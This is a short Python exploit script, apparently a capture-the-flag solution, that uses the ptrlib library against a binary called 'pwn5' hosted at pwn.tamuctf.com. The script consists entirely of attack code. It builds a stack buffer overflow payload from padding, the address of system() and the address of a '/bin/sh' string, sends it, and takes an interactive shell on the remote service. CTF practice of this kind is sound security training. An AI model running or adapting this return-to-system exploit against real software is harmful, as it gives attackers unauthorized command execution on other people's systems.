from ptrlib import *

elf = ELF("./pwn5")

sock = Socket("pwn.tamuctf.com", 4325)
#sock = Process("./pwn5")
sock.recvuntil("ls:")

payload = b'A' * 0x11
payload += p32(elf.symbol("system"))
payload += b'A' * 4
payload += p32(0x08048000 + next(elf.find("/bin/sh")))
print(repr(payload))
sock.sendline(payload)

sock.interactive()
